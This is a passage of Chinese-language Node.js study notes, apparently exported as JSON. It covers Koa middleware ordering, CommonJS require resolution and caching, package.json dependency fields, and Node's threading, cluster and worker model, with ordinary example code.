处理跨域\napp.use(compress());     // 压缩响应\napp.use(bodyParser());   // 解析请求体\n\n// 4. 业务相关中间件\napp.use(async (ctx, next) => {\n    // 验证用户身份\n    await auth(ctx, next);\n});\n\n// 5. 路由中间件\napp.use(router.routes());\n```\n\n### 7.2. 不同类型中间件的顺序说明\n\n#### 7.2.1. 错误处理中间件（最外层）\n\n```javascript\n// 应该放在最外层\napp.use(async (ctx, next) => {\n    try {\n        await next();\n    } catch (err) {\n        // 错误处理逻辑\n    }\n});\n```\n\n**原因**：\n- ==可以捕获所有其他中间件中的错误==\n- 统一的错误处理机制\n- 防止错误导致应用崩溃\n\n#### 7.2.2. 全局通用中间件（第二层）\n\n```javascript\n// 请求日志\napp.use(async (ctx, next) => {\n    console.log(`${ctx.method} ${ctx.url} - 开始`);\n    await next();\n    console.log(`${ctx.method} ${ctx.url} - 结束`);\n});\n\n// 响应时间统计\napp.use(async (ctx, next) => {\n    const start = Date.now();\n    await next();\n    const ms = Date.now() - start;\n    ctx.set('X-Response-Time', `${ms}ms`);\n});\n```\n\n**原因**：\n- 需要记录所有请求的信息\n- 不依赖于其他中间件的处理结果\n\n#### 7.2.3. 第三方功能中间件（第三层）\n\n```javascript\n// 处理跨域\napp.use(cors({\n    origin: '*',\n    allowMethods: ['GET', 'POST', 'PUT', 'DELETE']\n}));\n\n// 解析请求体\napp.use(bodyParser({\n    enableTypes: ['json', 'form']\n}));\n\n// 静态文件服务\napp.use(serve('./public'));\n```\n\n**原因**：\n- 为后续中间件提供基础功能\n- 相互之间可能有依赖关系\n\n#### 7.2.4. 业务相关中间件（内层）\n\n```javascript\n// 用户认证\napp.use(async (ctx, next) => {\n    const token = ctx.headers.authorization;\n    if (token) {\n        ctx.state.user = await verifyToken(token);\n    }\n    await next();\n});\n\n// 权限检查\napp.use(async (ctx, next) => {\n    if (!ctx.state.user) {\n        ctx.throw(401, '未授权');\n    }\n    await next();\n});\n```\n\n**原因**：\n- 依赖前面中间件的处理结果\n- 针对特定业务场景\n\n### 7.3. 特殊情况的顺序考虑\n\n#### 7.3.1. 性能相关中间件\n\n```javascript\n// 压缩应该在返回具体内容之前\napp.use(compress());\n\n// 缓存中间件\napp.use(async (ctx, next) => {\n    const cacheKey = `cache:${ctx.url}`;\n    const cached = await redis.get(cacheKey);\n    if (cached) {\n        ctx.body = cached;\n        return;\n    }\n    await next();\n    // 存储缓存\n    await redis.set(cacheKey, ctx.body);\n});\n```\n\n#### 7.3.2. 安全相关中间件\n\n```javascript\n// 安全头设置应该尽早\napp.use(async (ctx, next) => {\n    ctx.set('X-Frame-Options', 'DENY');\n    ctx.set('X-Content-Type-Options', 'nosniff');\n    await next();\n});\n\n// CSRF 保护\napp.use(csrf());\n```\n\n### 7.4. 常见问题和解决方案\n\n#### 7.4.1. 中间件冲突\n\n```javascript\n// 错误示例\napp.use(bodyParser());  // 解析 JSON\napp.use(async (ctx, next) => {\n    // 直接读取原始请求体\n    const raw = await getRawBody(ctx.req);  // 可能失败\n    await next();\n});\n\n// 正确示例\napp.use(async (ctx, next) => {\n    // 需要原始请求体的处理\n    const raw = await getRawBody(ctx.req);\n    ctx.state.rawBody = raw;\n    await next();\n});\napp.use(bodyParser());  // 之后再解析 JSON\n```\n\n#### 7.4.2. 条件中间件\n\n```javascript\n// 根据条件决定是否执行某个中间件\nconst conditionalMiddleware = (condition) => {\n    return async (ctx, next) => {\n        if (condition) {\n            // 执行特定逻辑\n            await someMiddleware(ctx, next);\n        } else {\n            await next();\n        }\n    };\n};\n```\n\n## 8. 注意事项\n\n### 8.1. **避免多次调用 next()**\n\n   ```javascript\n   app.use(async (ctx, next) => {\n       await next(); // 只调用一次\n       // await next(); // 错误：不要多次调用\n   });\n   ```\n\n### 8.2. 正确的顺序安排\n\n- 错误处理中间件应该放在最前面\n   - 请求处理中间件按照依赖关系排序\n\n```javascript\nconst Koa = require('koa');\nconst app = new Koa();\n\n// 1. 错误处理放在最前面\napp.use(async (ctx, next) => {\n  try {\n    await next();\n  } catch (err) {\n    ctx.status = err.status || 500;\n    ctx.body = { error: err.message };\n  }\n});\n\n// 2. 通用中间件（如日志）\napp.use(async (ctx, next) => {\n  const start = Date.now();\n  await next();\n  console.log(`${ctx.method} ${ctx.url} - ${Date.now() - start}ms`);\n});\n\n// 3. 第三方中间件\napp.use(bodyParser());\napp.use(cors());\n\n// 4. 业务中间件\napp.use(router.routes());\n```\n\n### 8.3. 避免顺序错误\n\n```javascript\n// ❌ 错误示例\napp.use(router.routes());  // 路由放在了错误处理前面\napp.use(errorHandler);     // 错误处理无法捕获路由中的错误\n\n// ✅ 正确示例\napp.use(errorHandler);     // 先注册错误处理\napp.use(router.routes());  // 再注册路由\n```\n\n### 8.4. 始终使用 await\n\n```javascript\n// ❌ 错误示例\napp.use(async (ctx, next) => {\n  doAsyncOperation(); // 未使用 await，异步操作可能不会完成\n  next(); // 未使用 await，可能导致洋葱模型失效\n});\n\n// ✅ 正确示例\napp.use(async (ctx, next) => {\n  await doAsyncOperation();\n  await next();\n});\n```\n\n### 8.5. 正确的错误处理\n\n```javascript\napp.use(async (ctx, next) => {\n  try {\n    await next();\n  } catch (err) {\n    // 确保错误被正确处理\n    ctx.status = err.status || 500;\n    ctx.app.emit('error', err, ctx);\n    throw err; // 继续向上传递错误\n  }\n});\n```\n\n### 8.6. 正确使用 ctx.state →  在中间件间共享数据\n\n```javascript\n// ✅ 正确示例：使用 ctx.state 在中间件间共享数据\napp.use(async (ctx, next) => {\n  ctx.state.user = await getUser(ctx.header.authorization);\n  await next();\n});\n\napp.use(async (ctx, next) => {\n  // 在后续中间件中使用\n  const user = ctx.state.user;\n  await next();\n});\n```\n\n### 8.7. 避免修改原始对象\n\n```javascript\n// ❌ 错误示例：直接修改原始请求对象\napp.use(async (ctx, next) => {\n  ctx.req.body = await parseBody(ctx.req);\n  await next();\n});\n\n// ✅ 正确示例：使用 ctx 提供的属性\napp.use(async (ctx, next) => {\n  ctx.request.body = await parseBody(ctx.req);\n  await next();\n});\n```\n\n### 8.8. 避免不必要的异步操作\n\n```javascript\napp.use(async (ctx, next) => {\n  // ✅ 正确示例：条件判断避免不必要的操作\n  if (ctx.path === '/api' && !ctx.state.user) {\n    ctx.throw(401);\n    return;\n  }\n  await next();\n});\n```\n\n### 8.9. 合理使用缓存\n\n```javascript\napp.use(async (ctx, next) => {\n  const cacheKey = `cache:${ctx.url}`;\n  const cached = await redis.get(cacheKey);\n  \n  if (cached) {\n    ctx.body = JSON.parse(cached);\n    return;\n  }\n  \n  await next();\n  \n  // 缓存响应\n  await redis.set(cacheKey, JSON.stringify(ctx.body), 'EX', 3600);\n});\n```\n\n### 8.10. 请求验证\n\n```javascript\napp.use(async (ctx, next) => {\n  // 验证请求头\n  const apiKey = ctx.headers['x-api-key'];\n  if (!apiKey) {\n    ctx.throw(401, 'API key required');\n  }\n  \n  // 验证请求大小\n  const contentLength = parseInt(ctx.headers['content-length']);\n  if (contentLength > 1024 * 1024) { // 1MB\n    ctx.throw(413, 'Request entity too large');\n  }\n  \n  await next();\n});\n```\n\n### 8.11. 响应头安全\n\n```javascript\napp.use(async (ctx, next) => {\n  await next();\n  \n  // 设置安全响应头\n  ctx.set('X-Content-Type-Options', 'nosniff');\n  ctx.set('X-Frame-Options', 'DENY');\n  ctx.set('X-XSS-Protection', '1; mode=block');\n});\n```\n\n### 8.12. 确保资源释放\n\n```javascript\napp.use(async (ctx, next) => {\n  const connection = await db.connect();\n  try {\n    ctx.state.db = connection;\n    await next();\n  } finally {\n    // 确保资源被释放\n    await connection.close();\n  }\n});\n```\n\n### 8.13. 超时处理\n\n```javascript\nconst timeout = ms => new Promise((resolve, reject) => {\n  setTimeout(() => reject(new Error('Request timeout')), ms);\n});\n\napp.use(async (ctx, next) => {\n  try {\n    await Promise.race([\n      next(),\n      timeout(5000) // 5秒超时\n    ]);\n  } catch (err) {\n    if (err.message === 'Request timeout') {\n      ctx.status = 504;\n      ctx.body = 'Request timeout';\n    } else {\n      throw err;\n    }\n  }\n});\n```\n\n### 8.14. 添加调试信息\n\n```javascript\napp.use(async (ctx, next) => {\n  const requestId = uuid();\n  ctx.state.requestId = requestId;\n  \n  console.log(`[${requestId}] Request started: ${ctx.method} ${ctx.url}`);\n  const startTime = Date.now();\n  \n  try {\n    await next();\n  } finally {\n    console.log(`[${requestId}] Request completed in ${Date.now() - startTime}ms`);\n  }\n});\n```\n\n### 8.15. 性能监控\n\n```javascript\napp.use(async (ctx, next) => {\n  const metrics = {\n    path: ctx.path,\n    method: ctx.method,\n    startTime: Date.now()\n  };\n  \n  try {\n    await next();\n    metrics.status = ctx.status;\n  } catch (err) {\n    metrics.error = err.message;\n    throw err;\n  } finally {\n    metrics.duration = Date.now() - metrics.startTime;\n    // 发送指标到监控系统\n    await sendMetrics(metrics);\n  }\n});\n```\n\n### 8.16. 集中式错误处理\n\n```javascript\n// 创建错误处理中间件\nconst errorHandler = async (ctx, next) => {\n  try {\n    await next();\n  } catch (err) {\n    ctx.status = err.status || 500;\n    ctx.body = {\n      error: {\n        code: err.code || 'INTERNAL_ERROR',\n        message: err.message || 'Internal Server Error',\n        ...(process.env.NODE_ENV === 'development' ? {stack: err.stack} : {})\n      }\n    };\n    // 记录错误\n    ctx.app.emit('error', err, ctx);\n  }\n};\n\n// 使用错误处理中间件\napp.use(errorHandler);\n```\n","epWBqiWG":"\n# commonjs 的 require 机制\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 基本加载过程：7 个步骤 \n\n1. 解析路径\n2. 检查==缓存==\n3. 创建==模块对象==\n4. 将模块放入==缓存==\n5. 加载模块\n6. 标记==模块对象== 为已加载\n7. 返回 `exports 对象`\n\n```javascript\n// require 的基本实现原理\nfunction require(modulePath) {\n\n    // 1. 解析路径\n    const absolutePath = resolveModulePath(modulePath);\n    \n    // 2. 检查缓存\n    if (require.cache[absolutePath]) {\n        return require.cache[absolutePath].exports;\n    }\n    \n    // 3. 创建模块对象\n    const module = {\n        exports: {},\n        loaded: false,\n        id: absolutePath\n    };\n    \n    // 4. 将模块放入缓存\n    require.cache[absolutePath] = module;\n    \n    // 5. 加载模块\n    loadModule(absolutePath, module, require);\n    \n    // 6. 标记为已加载\n    module.loaded = true;\n    \n    // 7. 返回 exports 对象\n    return module.exports;\n}\n```\n\n## 2. 模块缓存机制：查看缓存和清除缓存 →  `require.cache`\n\n```javascript\n// example.js\nmodule.exports = {\n    count: 0,\n    increment() {\n        this.count++;\n    }\n};\n\n// main.js\nconst module1 = require('./example');\nconst module2 = require('./example');\n\nconsole.log(module1 === module2); // true\n// 因为缓存的存在，两次 require 返回同一个对象\n\n// 查看缓存\nconsole.log(require.cache);\n// 清除缓存\ndelete require.cache[require.resolve('./example')];\n```\n\n## 3. 路径解析规则\n\n1. 核心模块\n2. 文件模块\n3. npm 包\n4. 文件扩展名解析路径 ==顺序如下==\n\t1. `.js`\n\t2. `.json`\n\t3. `.node`\n\t4. `mymodule/index.js\n\n```javascript hl:14\n// 1. 核心模块\nconst fs = require('fs');              // 直接从 Node.js 核心模块加载\n\n// 2. 文件模块\nconst myModule = require('./myModule'); // 相对路径\nconst config = require('/opt/config');  // 绝对路径\n\n// 3. npm 包\nconst lodash = require('lodash');      // 从 node_modules 查找\n\n// 文件扩展名解析顺序\nrequire('./myModule');  \n\n// 依次查找：\n// 1. myModule.js\n// 2. myModule.json\n// 3. myModule.node\n// 4. myModule/index.js\n```\n\n## 4. 模块包装机制\n\n```javascript hl:1\n// Node.js 实际上会将你的模块代码包装在一个函数中\n(function(exports, require, module, __filename, __dirname) {\n    // 你的模块代码在这里\n    const something = require('./something');\n    module.exports = {\n        // ...\n    };\n});\n```\n\n## 5. 异常处理\n\n- 比如\n\t- 处理模块不存在\n\t- 处理模块加载错误\n\n```javascript hl:2,10\ntry {\n    // 处理模块不存在\n    const nonExistent = require('./non-existent');\n} catch (err) {\n    if (err.code === 'MODULE_NOT_FOUND') {\n        console.log('模块未找到');\n    }\n}\n\n// 处理模块加载错误\ntry {\n    const badModule = require('./bad-module');\n} catch (err) {\n    console.error('模块加载失败:', err);\n}\n```\n\n## 6. 条件加载\n\n```javascript\n// 根据环境加载不同的配置\nconst config = require(process.env.NODE_ENV === 'production'\n    ? './config.prod'\n    : './config.dev');\n\n// 动态加载模块\nfunction loadPlugin(name) {\n    try {\n        return require(`./plugins/${name}`);\n    } catch (err) {\n        console.error(`插件 ${name} 加载失败`);\n        return null;\n    }\n}\n```\n\n## 7. 性能优化：比如 fs/path 等\n\n- ==缓存==路径\n- ==预加载==模块\n- ==延迟==模块\n\n```javascript hl:1,5,12\n// 1. 使用路径缓存\nconst modulePath = require.resolve('./myModule');\nconst myModule = require(modulePath);\n\n// 2. 预加载模块\nconst modules = {\n    fs: require('fs'),\n    path: require('path'),\n    util: require('util')\n};\n\n// 3. 延迟加载\nlet heavyModule;\nfunction getHeavyModule() {\n    if (!heavyModule) {\n        heavyModule = require('./heavyModule');\n    }\n    return heavyModule;\n}\n```\n\n## 8. 模块导出方式\n\n- `module.exports` 导出\n- `exports.xxx` 快捷方式\n\n```javascript\n// 1. module.exports 导出\nmodule.exports = {\n    method1() {},\n    method2() {}\n};\n\n// 2. exports 快捷方式\nexports.method1 = function() {};\nexports.method2 = function() {};\n\n// ❌  3. 注意: 直接赋值 exports 无效 \nexports = { method: () => {} };  // 这样做是错误的\n```\n\n## 9. 目录作为模块\n\n> 先找 pageage.json 中的 main 字段，然后再找对应的文件\n\n```javascript\n// myModule/index.js\nmodule.exports = {\n    // 模块内容\n};\n\n// myModule/package.json\n{\n    \"main\": \"lib/entry.js\"  // 指定入口文件\n}\n\n// 使用\nconst myModule = require('./myModule');\n```\n\n## 10. `require.main` 的使用  →  判断该模块是否是入口文件\n\n```javascript\n// 检查模块是否为入口文件\nif (require.main === module) {\n    // 直接运行此文件\n    console.log('这是主模块');\n} else {\n    // 被其他模块引用\n    console.log('这是被导入的模块');\n}\n```\n\n## 11. 调试技巧\n\n```javascript\n// 1. 查看模块搜索路径\nconsole.log(module.paths);\n\n// 2. 查看已加载的模块\nconsole.log(Object.keys(require.cache));\n\n// 3. 模块解析路径\nconsole.log(require.resolve('./myModule'));\n\n// 4. 模块元信息\nconsole.log(module);\n```\n\n## 12. 最佳实践\n\n1. 总是使用 `const` 声明 `require`\n2. 将所有 `require` 语句放在文件顶部\n3. 使用明确的文件扩展名\n4. 适当使用模块缓存机制\n5. 注意循环依赖问题\n6. 正确处理异常情况\n7. 合理组织模块结构\n8. 使用 `package.json` 管理依赖\n9. 注意模块加载性能\n10. 遵循单一职责原则\n\n## 13. 核心模块是**二进制和缓存**，所以很快\n\n- `require('fs')` 核心模块很快，因为是编译好的`二进制可执行文件` \n\t- 缓存：所以很快\n\n## 14. Node.js 中对不同扩展名文件的处理机制\n\n\n> `js → json → .node → 目录 → inex.js ...`\n\n### 14.1. 扩展名解析优先级\n\n```javascript\n// require 的扩展名解析优先级\nconst path = './myModule';\nrequire(path);  // 按以下顺序查找：\n// 1. ./myModule.js\n// 2. ./myModule.json\n// 3. ./myModule.node\n// 4. ./myModule/index.js\n// 5. ./myModule/index.json\n// 6. ./myModule/index.node\n```\n\n### 14.2. `.js` 文件处理\n\n```javascript\n// 1. JS 文件会被包装在函数中执行\n(function(exports, require, module, __filename, __dirname) {\n    // 你的 JS 代码\n    const foo = 'bar';\n    module.exports = { foo };\n});\n\n// 2. 支持所有 JavaScript 特性\n// example.js\nconst fs = require('fs');\n\nclass MyClass {\n    constructor() {\n        this.data = 'test';\n    }\n}\n\nmodule.exports = {\n    MyClass,\n    async readFile(path) {\n        return fs.promises.readFile(path, 'utf8');\n    }\n};\n```\n\n### 14.3. .json 文件处理\n\n>  会有 `json.parse ` 的操作\n\n```javascript\n// 1. JSON 文件直接被解析为对象\n// config.json\n{\n    \"host\": \"localhost\",\n    \"port\": 3000,\n    \"debug\": true\n}\n\n// 使用 JSON 文件\nconst config = require('./config.json');\nconsole.log(config.host);  // localhost\n\n// 2. JSON 文件的错误处理\ntry {\n    const badJson = require('./bad.json');\n} catch (err) {\n    if (err instanceof SyntaxError) {\n        console.error('JSON 解析错误');\n    }\n}\n\n// 3. JSON 文件是只读的\nconst config = require('./config.json');\nconfig.port = 4000;  // 修改只影响内存中的副本\n// 重新 require 时会获得原始文件的内容\n```\n\n### 14.4. `.node` 文件处理\n\n```javascript\n// .node 文件是编译好的 C++ 插件\n// 1. 加载 .node 文件\ntry {\n    const nativeModule = require('./addon.node');\n} catch (err) {\n    console.error('加载 native 模块失败:', err);\n}\n\n// 2. 通常通过 node-gyp 编译\n// binding.gyp\n{\n    \"targets\": [{\n        \"target_name\": \"addon\",\n        \"sources\": [ \"addon.cc\" ]\n    }]\n}\n\n// 3. C++ 插件示例\n// addon.cc\n`#include` <node.h>\n\nvoid Initialize(v8::Local<v8::Object> exports) {\n    // 导出函数和对象\n}\n\nNODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)\n```\n\n### 14.5. 目录模块处理：查找顺序\n\n总结：`pageage.json 的 main 字段` → `.js` → `.json` → `.node`\n\n```javascript hl:17,18,19,20\n// 1. package.json 方式\n// myModule/package.json\n{\n    \"name\": \"myModule\",\n    \"main\": \"./lib/index.js\"  // 指定入口文件\n}\n\n// 2. index 文件方式\n// myModule/index.js\nmodule.exports = {\n    // 模块内容\n};\n\n// 3. 目录模块加载顺序\nconst myModule = require('./myModule');\n// 查找顺序：\n// 1. ./myModule/package.json 中的 main 字段\n// 2. ./myModule/index.js\n// 3. ./myModule/index.json\n// 4. ./myModule/index.node\n```\n\n### 14.6. 特殊文件处理\n\n```javascript\n// 1. 处理二进制文件\nconst binary = require('fs').readFileSync('./file.bin');\n\n// 2. 处理源码文件\nconst sourceMap = require('./file.js.map');\n\n// 3. 处理配置文件\nconst tsConfig = require('./tsconfig.json');\nconst babelConfig = require('./.babelrc');\n```\n\n### 14.7. 自定义扩展名处理 →    `require.extensions`\n\n```javascript\n// 注册自定义扩展名处理器\nrequire.extensions['.xyz'] = function(module, filename) {\n    const content = fs.readFileSync(filename, 'utf8');\n    // 处理内容\n    module._compile(content, filename);\n};\n\n// 使用自定义扩展名\nconst xyzModule = require('./file.xyz');\n```\n\n### 14.8. 文件缓存机制  →  r`equire.cache` \n\n> require.cache \n\n```javascript hl:15,1,6\n// 1. 不同扩展名的缓存处理\nconst jsModule = require('./file.js');\nconst jsonModule = require('./file.json');\nconst nodeModule = require('./file.node');\n\n// 2. 清除特定扩展名的缓存\nfunction clearCache(extension) {\n    Object.keys(require.cache).forEach(key => {\n        if (key.endsWith(extension)) {\n            delete require.cache[key];\n        }\n    });\n}\n\n// 3. 监视文件变化：fs.watch\nconst fs = require('fs');\nfs.watch('./config.json', (event, filename) => {\n    delete require.cache[require.resolve('./config.json')];\n});\n```\n\n### 14.9. 错误处理最佳实践\n\n```javascript\nfunction safeRequire(path) {\n    try {\n        return require(path);\n    } catch (err) {\n        if (err.code === 'MODULE_NOT_FOUND') {\n            console.error(`模块 ${path} 不存在`);\n        } else if (err instanceof SyntaxError) {\n            console.error(`模块 ${path} 语法错误`);\n        } else {\n            console.error(`加载模块 ${path} 时发生错误:`, err);\n        }\n        return null;\n    }\n}\n\n// 使用示例\nconst config = safeRequire('./config.json') || defaultConfig;\nconst addon = safeRequire('./addon.node') || mockAddon;\n```\n\n### 14.10. 性能考虑\n\n- 缓存：比如使用 map 缓存\n- 大文件处理\n\t- 流式读取\n- 延迟处理\n\n```javascript hl:18\n// 1. JSON 文件缓存\nconst configs = new Map();\n\nfunction loadConfig(path) {\n    if (!configs.has(path)) {\n        configs.set(path, require(path));\n    }\n    return configs.get(path);\n}\n\n// 2. 大文件处理\nconst fs = require('fs');\nconst stream = fs.createReadStream('./large-file.json');\n// 使用流处理大型 JSON 文件\n\n// 3. 延迟加载\nlet heavyModule;\nfunction getHeavyModule() {\n    if (!heavyModule) {\n        heavyModule = require('./heavy.node');\n    }\n    return heavyModule;\n}\n```\n","d5UUKM2H":"\n# 常用的 package.json 字段说明\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 整体介绍 \n\n- module → esm , mjs\n- main → cjs\n- types \n- exports:{ ... }\n\n```json hl:5,9\n{\n  // 基础信息：忽略\n  // 入口文件配置\n  \"main\": \"./dist/index.js\",  // CommonJS 入口\n  \"module\": \"./dist/index.mjs\",// ES Module 入口\n  \"types\": \"./dist/index.d.ts\",// TypeScript 类型声明文件\n  \"exports\": {                // 现代化的导出配置\n    \".\": {\n      \"import\": \"./dist/index.mjs\",\n      \"require\": \"./dist/index.js\",\n      \"types\": \"./dist/index.d.ts\"\n    }\n  },\n\n  // 脚本命令：忽略\n  \"scripts\": {},\n\n  // 依赖配置\n  \"dependencies\": {           // 生产环境依赖\n    \"react\": \"^18.0.0\"\n  },\n  \"devDependencies\": {        // 开发环境依赖\n    \"typescript\": \"^5.0.0\",\n    \"vite\": \"^4.0.0\"\n  },\n  // `peerDependencies` \n  // 表示宿主项目中需要安装的依赖，这些依赖不会被自动安装，而是期望由使用该包的项目提供\n  // 1. 避免依赖重复安装\n  // 2. 确保版本兼容性 等\n  \"peerDependencies\": {      // 同版本对等依赖\n    \"react\": \"^18.0.0\"\n  },\n\n  // 项目配置\n  \"private\": true,           // 是否私有包\n  \"type\": \"module\",          // 指定模块类型(commonjs/module)\n  \"engines\": {               // 指定 node/npm 版本要求\n    \"node\": \">=14.0.0\",\n    \"npm\": \">=6.0.0\"\n  },\n\n  // 发布配置，npm 发布包含的文件\n  \"files\": [                \n    \"dist\",\n    \"README.md\"\n  ]\n}\n```\n\n### 1.1. 总结\n\n- 开发库/框架时\n\t- 重点关注：\n\t\t- `main`、`module`、`types`、`exports`、`peerDependencies`\n- 开发应用时\n\t- 重点关注：\n\t\t- `scripts`、`dependencies`、`devDependencies`\n- 发布 npm 包时\n\t- 重点关注：\n\t\t- `name`、`version`、`files`、`keywords`\n\n## 2. devDependencies 和 dependencies 区别\n\n### 2.1. 主要区别\n\n- dependencies：\n\t* **运行时**必需的依赖\n\t* **会被打包到生产环境**\n\t* 项目运行必须的包\n- devDependencies：\n\t* **开发时**需要的依赖\n\t* **不会被打包到生产环境**\n\t* 仅在开发过程中使用的包\n\n### 2.2. 安装命令的区别\n\n```bash\n# 安装到 dependencies\nnpm install axios --save\n# 或\nnpm install axios -S\n# 或\nnpm install axios\n\n# 安装到 devDependencies\nnpm install webpack --save-dev\n# 或\nnpm install webpack -D\n```\n\n### 2.3. 典型使用场景\n\n`dependencies` 适用于：\n\n```json\n{\n  \"dependencies\": {\n    // 运行时框架\n    \"vue\": \"^3.3.0\",\n    \"react\": \"^18.2.0\",\n    \n    // 功能性库\n    \"axios\": \"^1.5.0\",\n    \"lodash\": \"^4.17.21\",\n    \n    // UI 组件库\n    \"element-plus\": \"^2.3.0\",\n    \"ant-design-vue\": \"^4.0.0\",\n    \n    // 路由\n    \"vue-router\": \"^4.2.0\",\n    \n    // 状态管理\n    \"vuex\": \"^4.1.0\"\n  }\n}\n```\n\n`devDependencies` 适用于：\n\n```json\n{\n  \"devDependencies\": {\n    // 构建工具\n    \"webpack\": \"^5.88.0\",\n    \"vite\": \"^4.4.0\",\n    \n    // 代码检查\n    \"eslint\": \"^8.45.0\",\n    \"prettier\": \"^3.0.0\",\n    \n    // 测试工具\n    \"jest\": \"^29.6.0\",\n    \"vitest\": \"^0.34.0\",\n    \n    // 类型定义\n    \"@types/node\": \"^20.4.0\",\n    \n    // 开发服务器\n    \"webpack-dev-server\": \"^4.15.0\",\n    \n    // 编译器/转译器\n    \"typescript\": \"^5.1.0\",\n    \"babel-loader\": \"^9.1.0\"\n  }\n}\n```\n\n### 2.4. 环境影响\n\n开发环境：\n\n```bash\n# 安装所有依赖\nnpm install\n# 会同时安装 dependencies 和 devDependencies 中的所有包\n```\n\n生产环境：\n\n```bash\n# 只安装 dependencies\nnpm install --production\n# 或\nNODE_ENV=production npm install\n```\n\n### 2.5. 项目部署考虑\n\n```json hl:4\n{\n  \"scripts\": {\n    \"build\": \"webpack --mode production\",\n    \"deploy\": \"npm ci --production && node server.js\"\n  }\n}\n```\n\n>  在部署时，通常只需要安装 `dependencies`，可以减少安装包的大小和时间\n\n### 2.6. 依赖分类的建议\n\n```json\n{\n  \"dependencies\": {\n    // 1. 项目运行必需的框架和库\n    \"vue\": \"^3.3.0\",\n    // 2. 生产环境需要的功能模块\n    \"axios\": \"^1.5.0\",\n    // 3. 用户交互必需的UI组件\n    \"element-plus\": \"^2.3.0\"\n  },\n  \"devDependencies\": {\n    // 1. 开发工具和构建工具\n    \"webpack\": \"^5.88.0\",\n    // 2. 代码质量和测试工具\n    \"eslint\": \"^8.45.0\",\n    // 3. 类型定义文件\n    \"@types/node\": \"^20.4.0\"\n  }\n}\n```\n\n### 2.7. 注意事项\n\n#### 2.7.1. 依赖版本管理\n\n```json\n{\n  \"dependencies\": {\n    \"package1\": \"^1.0.0\",  // 自动更新小版本和补丁版本\n    \"package2\": \"~1.0.0\",  // 只更新补丁版本\n    \"package3\": \"1.0.0\"    // 固定版本\n  }\n}\n```\n\n#### 2.7.2. 安全考虑\n\n```bash hl:2,3\n# 定期更新依赖以修复安全漏洞\nnpm audit\nnpm audit fix\n\n# 使用 package-lock.json 锁定版本\nnpm ci\n\n# 开发环境\nnpm install  # 可以使用 npm install\n\n# 测试/构建/部署环境\nnpm ci  # 推荐使用 npm ci\n\n# 团队协作\ngit add package-lock.json  # 确保将 package-lock.json 提交到版本控制\n\n```\n\n### 2.8. 使用 npm ci →  严格按照 `package-lock.json` 来安装\n\n```markdown hl:7,6\n# npm install\n- 会修改 package-lock.json\n- 可以安装单个包\n- 可以在没有 package-lock.json 的情况下工作\n\n# npm ci\n- 严格按照 package-lock.json 安装\n- 不能安装单个包\n- 必须有 package-lock.json\n- 安装前会删除 node_modules\n\n```\n\n","GLwNQwLb":"\n# Nodejs 的单线程与多核\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- ==IO 密集==型：\n\t- 使用异步 I/O 即可，不需要多进程/多线程\n- ==CPU 密集型==应用：\n\t- 使用 Worker Threads\n- Web 服务器：\n\t- 通过 ==cluster 模块==实现**多进程、多核**\n\t\t- 多核 = 多线程，对于 node 而言\n\t\t- 适合任务是**隔离的** ，比如 HTTP 服务器\n\n## 2. Node.js 中的进程和线程机制\n\n### 2.1. 基本概念\n\n- 进程（Process）：\n\t- 是操作系统分配资源的最小单位，每个进程都有自己**独立的内存空间**\n- 线程（Thread）：\n\t- 是 CPU 调度的最小单位，同一进程内的线程**共享内存空间**\n\n### 2.2. Node.js 的单线程特性\n\n- Node.js 默认运行在`单线程环境`中，这个主线程被称为\"事件循环\"（Event Loop）\n- 虽然是单线程\n\t- 使用**事件驱动**和==非阻塞 I/O 模型==来处理并发\n\t- 但通过**事件循环**可以==高效处理大量并发连接==\n\n### 2.3. 多进程支持：child_process 模块\n\n- Node.js 提供了 `child_process` 模块，允许`创建子进程`\n\t- 常用的方法包括：\n\t\t- `fork()`: 专门用于创建 Node.js 进程\n\t\t- `spawn()`: 启动一个子进程来执行命令\n\t\t- `exec()`: 启动一个 shell 并在 shell 中执行命令\n- 通过 `cluster` 模块可以**创建共享服务器端口的子进程** \n\n### 2.4. 多线程支持：Worker Threads（工作线程） \n\n- Node.js 从版本 10.5.0 开始引入了 `worker_threads` 模块\n- 允许在 Node.js 中运行**真正的多线程代码**\n\t- 特点：\n\t\t- 线程之间可以共享内存\n\t\t- 通过消息传递进行通信\n\t\t- 每个工作线程都有自己的事件循环\n\n### 2.5. 进程 vs 工作线程\n\n- 进程：\n\t- 独立的内存空间\n\t- 更高的资源开销\n\t- 适合 `CPU 密集型`任务\n\t- 通过 `IPC`（进程间通信）交换数据\n- 工作线程：\n\t- 共享内存空间\n\t- 更低的资源开销\n\t- 适合并行计算\n\t- 通过 `postMessage()` 进行通信 \n\n### 2.6. 最佳实践\n\n- CPU 密集型任务：\n\t- 使用 Worker Threads\n- I/O 密集型任务：\n\t- 使用异步操作即可\n- 需要隔离的任务：\n\t- 使用`子进程`\n- 需要扩展到多核：\n\t- 使用 `cluster 模块`\n\n#### 2.6.1. 创建工作线程\n\n````javascript  hl:14,6\nconst { Worker, isMainThread, parentPort } = require('worker_threads');\n\nif (isMainThread) {\n  // 这段代码运行在主线程\n  const worker = new Worker(__filename);\n  worker.on('message', (msg) => {\n    console.log('从工作线程收到:', msg);\n  });\n  worker.postMessage('Hello, Worker!');\n} else {\n  // 这段代码运行在工作线程\n  parentPort.on('message', (msg) => {\n    console.log('从主线程收到:', msg);\n    parentPort.postMessage('Hello, Main Thread!');\n  });\n}\n````\n\n#### 2.6.2. 创建子进程\n\n````javascript hl:7,10\nconst { fork } = require('child_process');\n\n// 创建子进程\nconst child = fork('child.js');\n\n// 发送消息给子进程\nchild.send({ hello: 'world' });\n\n// 接收子进程的消息\nchild.on('message', (msg) => {\n  console.log('从子进程收到:', msg);\n});\n````\n\n### 2.7. 注意事项\n\n1. 不要为了使用多线程而使用多线程，Node.js 的单线程模型在大多数情况下已经足够高效\n2. 在使用 Worker Threads 时要注意**内存管理**，避免过度创建线程\n3. 进程间通信会有性能开销，需要根据实际场景选择合适的方案\n4. 在使用**集群模式**时，要注意**状态同步问题**\n\n## 3. nodejs是单线程的， 那么它是如何利用现代计算机的多核能力的\n\n虽然 Node.js 的主线程是单线程的，但它提供了**多种方式**来利用多核处理器：\n\n### 3.1. Node.js 的单线程本质\n\nNode.js 的`单线程`主要体现在：\n\n- 事件循环（Event Loop）运行在单个线程上\n- JavaScript 代码执行在`主线程`上\n- 